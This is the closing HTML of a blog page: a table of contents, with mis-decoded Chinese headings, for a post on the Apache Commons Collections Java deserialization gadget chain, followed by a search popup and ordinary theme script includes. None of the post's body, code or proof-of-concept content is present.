        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E4%B9%8B%E5%89%8D"><span class="nav-number">1.</span> <span class="nav-text">å†™åœ¨ä¹‹å‰</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E4%B8%8E%E6%B5%81%E7%A8%8B%E7%9B%B8%E5%85%B3"><span class="nav-number">2.</span> <span class="nav-text">ç¯å¢ƒä¸æµç¨‹ç›¸å…³</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">æµç¨‹åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#org-apache-commons-collections-functors-InvokerTransformer-class"><span class="nav-number">3.1.</span> <span class="nav-text">org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;functors&#x2F;InvokerTransformer.class</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#org-apache-commons-collections-functors-ChainedTransformer-class"><span class="nav-number">3.2.</span> <span class="nav-text">org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;functors&#x2F;ChainedTransformer.class</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#org-apache-commons-collections-functors-ConstantTransformer-class"><span class="nav-number">3.3.</span> <span class="nav-text">org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;functors&#x2F;ConstantTransformer.class</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Transform-%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">4.</span> <span class="nav-text">Transform()æ–¹æ³•çš„åˆ©ç”¨æ¡ä»¶</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TransformedMap%E6%94%BB%E5%87%BB%E9%93%BE"><span class="nav-number">5.</span> <span class="nav-text">TransformedMapæ”»å‡»é“¾</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#TransformedMap-checkSetValue"><span class="nav-number">5.1.</span> <span class="nav-text">TransformedMap.checkSetValue()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TransformedMap-decorate"><span class="nav-number">5.2.</span> <span class="nav-text">TransformedMap.decorate()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AbstractInputCheckedMapDecorator-MapEntry-setValue"><span class="nav-number">5.3.</span> <span class="nav-text">AbstractInputCheckedMapDecorator$MapEntry.setValue()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AbstractInputCheckedMapDecorator-EntrySetIterator-next"><span class="nav-number">5.4.</span> <span class="nav-text">AbstractInputCheckedMapDecorator$EntrySetIterator.next()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AbstractInputCheckedMapDecorator-EntrySet-iterator"><span class="nav-number">5.5.</span> <span class="nav-text">AbstractInputCheckedMapDecorator$EntrySet.iterator()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AbstractInputCheckedMapDecorator-entrySet"><span class="nav-number">5.6.</span> <span class="nav-text">AbstractInputCheckedMapDecorator.entrySet()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TransformedMap-isSetValueChecking"><span class="nav-number">5.7.</span> <span class="nav-text">TransformedMap.isSetValueChecking()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CPOC"><span class="nav-number">6.</span> <span class="nav-text">æœ¬åœ°å‘½ä»¤æ‰§è¡ŒPOC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BB%B6%E9%95%BF%E6%94%BB%E5%87%BB%E9%93%BE"><span class="nav-number">7.</span> <span class="nav-text">å»¶é•¿æ”»å‡»é“¾</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#annotation-AnnotationInvocationHandler-readObject"><span class="nav-number">7.1.</span> <span class="nav-text">annotation&#x2F;AnnotationInvocationHandler.readObject()</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1"><span class="nav-number">7.1.1.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2"><span class="nav-number">7.1.2.</span> <span class="nav-text">2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3"><span class="nav-number">7.1.3.</span> <span class="nav-text">3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4"><span class="nav-number">7.1.4.</span> <span class="nav-text">4</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CPOC"><span class="nav-number">8.</span> <span class="nav-text">ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡ŒPOC</span></a></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="æœç´¢..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/lazyload.js"></script>


<div class="post-scripts">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/toc.js"></script>
    
</div>



</body>
</html>
